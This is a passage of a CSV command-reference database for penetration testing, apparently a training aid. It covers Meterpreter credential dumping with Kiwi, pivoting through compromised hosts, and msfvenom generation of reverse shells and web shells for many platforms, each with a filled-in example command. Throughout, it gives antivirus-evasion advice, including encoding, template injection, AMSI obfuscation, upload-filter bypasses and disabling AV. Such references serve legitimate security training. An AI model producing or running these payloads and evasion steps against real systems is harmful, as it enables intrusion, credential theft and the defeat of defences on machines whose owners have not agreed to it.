creds_all, lsa_dump_sam, dcsync, golden_ticket_create, etc.

Often flagged by AV/EDR.","high","","","","{""load_failed"": ""Ensure running as administrator or SYSTEM"", ""av_detected"": ""Kiwi/Mimikatz often detected by AV - disable AV or use alternatives""}","","","",""
"meterpreter-kiwi-creds-all","Dump All Credentials with Kiwi","exploitation","creds_all","Extract all available credentials from memory using Kiwi (after loading)","metasploit","","Extracts credentials from LSASS memory.

Requires admin/SYSTEM.

Results automatically stored in Metasploit database.

Use msf-db-creds to view.","high","","","","{""no_cleartext"": ""WDigest disabled on modern Windows - only hashes available"", ""kiwi_not_loaded"": ""Load Kiwi first with: load kiwi""}","{""creds_all"": ""Dump all credential types"", ""creds_msv"": ""Dump MSV credentials only (LM/NTLM)"", ""creds_wdigest"": ""Dump WDigest credentials (cleartext if enabled)"", ""creds_kerberos"": ""Dump Kerberos tickets"", ""creds_livessp"": ""Dump LiveSSP credentials""}","[""meterpreter-load-kiwi""]","","[""msf-db-creds""]"
"meterpreter-screenshot","Capture Screenshot","exploitation","screenshot","Capture screenshot of target system's current desktop","metasploit","","Useful for documentation and identifying sensitive information on screen.

Saved to ~/.msf4/loot/ by default.

Requires active desktop session.","low","","","","{""no_desktop"": ""Requires active desktop session - check if user logged in"", ""black_screen"": ""Screen may be locked or user switched""}","{""-v"": ""View screenshot immediately after capture""}","","",""
"meterpreter-idletime","Check User Idle Time","exploitation","idletime","Display how long user has been idle (no keyboard/mouse input)","metasploit","","Use to determine if user is actively at computer.

High idle time = safer to run visible commands without detection.

Check before screenshot, keylogging, or GUI manipulation.","medium","","","","","","","",""
"meterpreter-route-add","Add Route to Internal Network","exploitation","run autoroute -s <SUBNET>/<NETMASK>","Add routing through compromised host to reach internal network","metasploit","run autoroute -s 172.16.5.0/24","Enables Metasploit modules to target internal networks through compromised host.

Use 'run autoroute -p' to view routes.

Combine with SOCKS proxy for external tool access.","high","","","","{""route_not_working"": ""Verify target has interface on internal network with ifconfig/ipconfig""}","{""-s"": ""Add subnet route"", ""-p"": ""Print current routes"", ""-d"": ""Delete route""}","","","[""msf-aux-portscan-tcp""]"
"meterpreter-portfwd-add","Forward Port Through Compromised Host","exploitation","portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_HOST>","Create port forward from attacker machine through compromised host to internal target","metasploit","portfwd add -l 3389 -p 3389 -r 172.16.5.100","Example:
Forward RDP:
portfwd add -l 3389 -p 3389 -r 172.16.5.100, then connect to localhost:3389.

List forwards:
portfwd list.

Delete:
portfwd delete -l <port>","high","","","","{""port_in_use"": ""Choose different local port"", ""connection_refused"": ""Verify remote host/port accessible from compromised host""}","{""add"": ""Create new port forward"", ""-l"": ""Local port (attacker machine)"", ""-p"": ""Remote port (target)"", ""-r"": ""Remote host (target IP)"", ""list"": ""Show active port forwards"", ""delete"": ""Remove port forward""}","","",""
"meterpreter-ipconfig","Display Network Configuration","exploitation","ipconfig","Display network interfaces, IP addresses, and routing info on compromised host","metasploit","","Critical for identifying internal networks for pivoting. Look for multiple interfaces indicating dual-homed host. Use with autoroute for lateral movement.","high","","","","","","","",""
"msfvenom-list-payloads","List Available Payloads","exploitation","msfvenom -l payloads --platform <PLATFORM> --arch <ARCH>","Display all payloads available for specific platform and architecture","metasploit","msfvenom -l payloads --platform windows --arch x64","Staged payloads contain '/' (e.g., windows/meterpreter/reverse_tcp).

Non-staged contain '_' (e.g., windows/meterpreter_reverse_tcp).

Use filters to reduce overwhelming output.","medium","","","","{""command_not_found"": ""Install Metasploit: sudo apt install metasploit-framework""}","{""-l payloads"": ""List all available payloads"", ""--platform"": ""Filter by target OS platform"", ""--arch"": ""Filter by CPU architecture"", ""-l formats"": ""List available output formats (exe, elf, php, etc)"", ""-l encoders"": ""List available encoders for evasion""}","","","[""msfvenom-windows-reverse"", ""msfvenom-linux-reverse""]"
"msfvenom-windows-reverse","Generate Windows Reverse Shell Executable","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe","Create Windows 64-bit executable with non-staged TCP reverse shell","metasploit","msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe","Non-staged payload (shell_reverse_tcp) is self-contained.

Staged variant (shell/reverse_tcp) requires multi/handler.

Use Netcat for non-staged, multi/handler for staged.","high","","","","{""antivirus_detected"": ""Use encoding: -e x86/shikata_ga_nai -i 3"", ""payload_too_large"": ""Use staged variant: windows/x64/shell/reverse_tcp (smaller first stage)"", ""wrong_arch"": ""For 32-bit: windows/shell_reverse_tcp (no x64)""}","{""-p"": ""Specify payload"", ""LHOST"": ""Listener host (attacker IP)"", ""LPORT"": ""Listener port (attacker port)"", ""-f"": ""Output format (exe, elf, php, asp, war, etc)"", ""-o"": ""Output file path"", ""-e"": ""Encoder for evasion (optional)"", ""-i"": ""Encoding iterations (optional)"", ""--platform"": ""Force platform (optional)"", ""--arch"": ""Force architecture (optional)""}","","","[""msf-handler-setup"", ""nc-listener""]"
"msfvenom-windows-meterpreter","Generate Windows Meterpreter Executable","exploitation","msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o met.exe","Create Windows 64-bit executable with non-staged Meterpreter over HTTPS","metasploit","msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.5 LPORT=443 -f exe -o met.exe","HTTPS transport encrypts C2 traffic and blends with normal web traffic.

Requires multi/handler with matching payload.

Non-staged (_) vs staged (/) distinction critical for handler setup.","high","","","","{""handler_mismatch"": ""Must use matching payload in multi/handler: windows/x64/meterpreter_reverse_https"", ""large_file_size"": ""Meterpreter non-staged is ~200KB (staged is smaller but requires handler)""}","{""meterpreter_reverse_https"": ""Non-staged Meterpreter with encrypted HTTPS transport"", ""meterpreter/reverse_https"": ""Staged variant (smaller but requires multi/handler)"", ""meterpreter_reverse_tcp"": ""Non-staged over raw TCP (alternative)"", ""-f exe"": ""Windows executable format""}","","",""
"msfvenom-linux-reverse","Generate Linux ELF Reverse Shell","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf","Create Linux 64-bit ELF executable with non-staged TCP reverse shell","metasploit","msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f elf -o shell.elf","After uploading to target, must chmod +x before execution.

ELF binaries often caught by AV - consider alternatives like scripting languages (Python, Bash).","high","","","","{""wrong_arch"": ""Check target arch with: uname -m (x86_64 = x64, i686 = x86)"", ""not_executable"": ""After transfer, make executable: chmod +x shell.elf"", ""permission_denied"": ""Execute as: ./shell.elf (or from /tmp with noexec bypass)""}","{""linux/x64/shell_reverse_tcp"": ""64-bit non-staged shell"", ""linux/x86/shell_reverse_tcp"": ""32-bit variant"", ""-f elf"": ""Linux ELF executable format""}","","","[""nc-listener"", ""chmod-executable""]"
"msfvenom-php-reverse","Generate PHP Web Shell","exploitation","msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php","Create PHP Meterpreter reverse shell for web application exploitation","metasploit","msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f raw -o shell.php","Upload via file upload vulnerability or writable web directory.

Execute by browsing to uploaded file.

PHP Meterpreter has limited features compared to Windows/Linux variants.","high","","","","{""upload_blocked"": ""Rename extension (shell.php.jpg, shell.pHP, etc)"", ""shell_not_executing"": ""Ensure uploaded to executable directory (not /uploads with execute disabled)"", ""handler_timeout"": ""Verify PHP script executed via web browser/curl""}","{""php/meterpreter_reverse_tcp"": ""PHP Meterpreter payload"", ""php/reverse_php"": ""Alternative simple PHP reverse shell"", ""-f raw"": ""Raw output format (pure PHP code)""}","","[""php-reverse-shell""]",""
"msfvenom-aspx-reverse","Generate ASPX Web Shell","exploitation","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx","Create ASPX web shell for IIS server exploitation","metasploit","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f aspx -o shell.aspx","ASPX shells run on Windows IIS servers.

Upload via file upload vuln or writable webdav.

Default IIS execution context is low-privileged service account.","medium","","","","{""upload_blocked"": ""Try .aspx, .asmx, or .ashx extensions"", ""execution_failed"": ""Verify IIS server allows ASPX execution in upload directory"", ""permissions_denied"": ""ASPX executes as IIS user (often low privileges)""}","{""-f aspx"": ""ASP.NET format for IIS servers"", ""-f asp"": ""Classic ASP format (older IIS versions)""}","","","[""msf-handler-setup""]"
"msfvenom-jsp-reverse","Generate JSP Web Shell","exploitation","msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp","Create JSP web shell for Java application servers (Tomcat, JBoss, WebLogic)","metasploit","msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f raw -o shell.jsp","JSP format for manual upload.

WAR format for Tomcat Manager deployment.

JSP files must be in webroot or accessible web directory.","medium","","","","{""war_preferred"": ""For Tomcat Manager, use -f war instead of -f raw"", ""execution_context"": ""JSP runs as Tomcat service user (often tomcat or tomcat7)""}","{""java/jsp_shell_reverse_tcp"": ""JSP reverse shell payload"", ""-f raw"": ""Raw JSP code output"", ""-f war"": ""WAR file format (alternative for Tomcat deployment)""}","","","[""nc-listener""]"
"msfvenom-war-reverse","Generate WAR Reverse Shell for Tomcat","exploitation","msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war","Create WAR file containing reverse shell for Tomcat Manager deployment","metasploit","msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f war -o shell.war","Deploy via Tomcat Manager GUI or curl.

After deployment, trigger by browsing to deployed application path.

Default WAR name becomes URL path (/shell.war -> /shell/).","high","","","","{""deployment_failed"": ""Check Tomcat Manager credentials"", ""shell_not_executing"": ""After deploying, browse to /shell/ to trigger payload""}","{""-f war"": ""Java Web Application Archive format"", ""java/jsp_shell_reverse_tcp"": ""JSP-based reverse shell""}","","","[""nc-listener""]"
"msfvenom-python-reverse","Generate Python Reverse Shell Script","exploitation","msfvenom -p python/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py","Create Python script with reverse shell payload","metasploit","msfvenom -p python/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f raw -o shell.py","Python scripts work cross-platform (Linux, Windows with Python installed).

Less suspicious than compiled binaries.

Can be executed without file write via:
echo '<CODE>' | python","medium","","","","{""python_version"": ""Ensure Python installed on target: which python || which python3"", ""execution"": ""Run with: python shell.py or python3 shell.py""}","{""python/shell_reverse_tcp"": ""Python-based reverse shell"", ""python/meterpreter_reverse_tcp"": ""Python Meterpreter variant"", ""-f raw"": ""Output pure Python code""}","","[""python-reverse-shell""]","[""nc-listener""]"
"msfvenom-powershell-reverse","Generate PowerShell Reverse Shell","exploitation","msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f psh -o shell.ps1","Create PowerShell script with Meterpreter reverse shell","metasploit","msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -f psh -o shell.ps1","PowerShell payloads fileless and memory-resident.

Execute without touching disk:
powershell -c <BASE64_PAYLOAD>.

Often caught by AV/EDR - use encoding/obfuscation.","high","","","","{""execution_policy"": ""Bypass with: powershell -ep bypass -File shell.ps1"", ""amsi_detected"": ""PowerShell payloads often flagged by AMSI - consider obfuscation"", ""handler_required"": ""Staged payload requires multi/handler with matching settings""}","{""-f psh"": ""PowerShell script format"", ""-f ps1"": ""Alternative PowerShell format"", ""windows/x64/meterpreter/reverse_tcp"": ""Staged Meterpreter (requires handler)""}","","","[""msf-handler-setup""]"
"msfvenom-bash-reverse","Generate Bash Reverse Shell Script","exploitation","msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh","Create Bash script with reverse shell payload","metasploit","msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.5 LPORT=443 -f raw -o shell.sh","Bash payloads work on most Linux/Unix systems.

Can be executed inline:
bash -c '<PAYLOAD>'.

No file write needed for command injection.","medium","","","","{""dev_tcp_unsupported"": ""Some shells don't support /dev/tcp - use nc alternative"", ""execution"": ""Make executable: chmod +x shell.sh && ./shell.sh""}","{""cmd/unix/reverse_bash"": ""Bash reverse shell command"", ""cmd/unix/reverse"": ""Generic Unix reverse shell (sh-compatible)"", ""-f raw"": ""Output raw bash code""}","","[""bash-reverse-shell""]","[""nc-listener""]"
"msfvenom-encode","Encode Payload for AV Evasion","exploitation","msfvenom -p <PAYLOAD> <OPTIONS> -e x86/shikata_ga_nai -i 3 -f <FORMAT> -o encoded.exe","Encode payload multiple times to evade antivirus signature detection","metasploit","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.5 LPORT=443 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe","Encoding is less effective against modern AV/EDR (behavioral detection).

Use as one layer of obfuscation, not sole evasion technique.

Iterations above 5-10 provide diminishing returns.","medium","","","","{""still_detected"": ""Encoding alone insufficient for modern AV - use additional obfuscation"", ""payload_too_large"": ""More iterations = larger file - balance evasion vs size"", ""encoder_incompatible"": ""Not all encoders work with all payloads - try different encoder""}","{""-e"": ""Encoder module to use"", ""-i"": ""Number of encoding iterations (more = better evasion, larger payload)"", ""x86/shikata_ga_nai"": ""Polymorphic XOR additive feedback encoder (popular)"", ""x86/call4_dword_xor"": ""Alternative encoder"", ""-b"": ""Bad characters to avoid (e.g., -b '\\x00\\x0a\\x0d')""}","","",""
"msfvenom-bad-chars","Generate Payload Avoiding Bad Characters","exploitation","msfvenom -p <PAYLOAD> <OPTIONS> -b '<BAD_CHARS>' -f <FORMAT>","Generate payload that avoids specified bad characters for buffer overflow exploitation","metasploit","msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -b '\x00\x0a\x0d' -f python","Common bad chars:
\x00 (null), \x0a (newline), \x0d (carriage return).

Use -f python/c for easy integration into exploit code.

Verify payload manually before use.","high","","","","{""no_encoder_found"": ""Too restrictive bad char list - verify bad chars are actually bad"", ""payload_contains_bad_char"": ""Manually verify payload: hexdump -C shellcode | grep '<BAD_CHAR>'""}","{""-b"": ""Bad characters to avoid"", ""-f c"": ""C array format (for C code)"", ""-f python"": ""Python array format"", ""-f raw"": ""Raw binary shellcode""}","","",""
"msfvenom-custom-template","Inject Payload into Custom Template","exploitation","msfvenom -p <PAYLOAD> <OPTIONS> -x <TEMPLATE_EXE> -f exe -o output.exe","Inject payload into existing executable template to avoid detection","metasploit","msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.45.5 LPORT=443 -x /usr/share/windows-resources/binaries/plink.exe -f exe -o output.exe","Template injection helps blend payload into legitimate-looking executable.

Use -k to maintain template's original function.

Effectiveness limited against modern AV/EDR.","low","","","","{""template_broken"": ""Use -k flag to preserve template functionality"", ""still_detected"": ""Modern AV detects injection patterns - not reliable evasion alone"", ""wrong_arch"": ""Template and payload must match architecture (x86 vs x64)""}","{""-x"": ""Specify custom template executable"", ""-k"": ""Preserve template behavior (keep original functionality)"", ""-f exe"": ""Output format (must match template type)""}","","",""
"msfvenom-php-shell","Generate PHP Reverse Shell","exploitation","msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php","Create simple PHP reverse shell for web application exploitation","metasploit","msfvenom -p php/reverse_php LHOST=192.168.45.5 LPORT=443 -f raw -o shell.php","Upload via file upload vulnerability. Execute by browsing to uploaded file. Add <?php tags if needed.","high","","","","","{""php/reverse_php"": ""Simple PHP reverse shell (non-Meterpreter)"", ""-f raw"": ""Raw PHP code output""}","","",""
"msfvenom-aspx-shell","Generate ASPX Reverse Shell","exploitation","msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx","Create ASPX web shell for IIS server exploitation","metasploit","msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f aspx -o shell.aspx","For IIS servers. Upload via file upload or WebDAV. Browse to execute. Non-staged works with nc listener.","high","","","","","{""-f aspx"": ""ASP.NET format for IIS servers"", ""windows/shell_reverse_tcp"": ""Non-staged shell (works with netcat listener)""}","","",""
"msfvenom-encode-shikata","Encode Payload with Shikata Ga Nai","exploitation","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i <ITERATIONS> -f <FORMAT> -o payload.exe","Encode payload with polymorphic XOR encoder for AV evasion","metasploit","msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe","Shikata ga nai is most popular encoder but increasingly detected. Use as one layer of obfuscation. 5-10 iterations usually sufficient.","medium","","","","","{""-e x86/shikata_ga_nai"": ""Polymorphic XOR additive feedback encoder"", ""-i"": ""Encoding iterations (more = better evasion but larger payload)""}","","",""
"msfvenom-badchars","Generate Payload Avoiding Bad Characters","exploitation","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -b '<BADCHARS>' -f <FORMAT>","Generate payload that avoids specified bad characters for buffer overflow exploitation","metasploit","msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -b '\x00\x0a\x0d' -f python","Common bad chars: \x00 (null), \x0a (newline), \x0d (CR). For buffer overflow exploits, test all chars with bytearray then specify bad ones. Use -f python or -f c for easy integration.","high","","","","","{""-b"": ""Bad characters to avoid - shellcode won't contain these bytes"", ""-f python"": ""Python array format for exploit scripts"", ""-f c"": ""C array format for C exploits""}","","",""
"msfvenom-list-formats","List Available Output Formats","exploitation","msfvenom -l formats","List all available payload output formats (exe, elf, php, asp, etc.)","metasploit","","Common formats: exe (Windows), elf (Linux), raw (shellcode), python/c (exploit dev), php/asp/aspx/jsp/war (web shells). Match format to target OS and use case.","medium","","","","","{""-l formats"": ""List all output format options""}","","",""
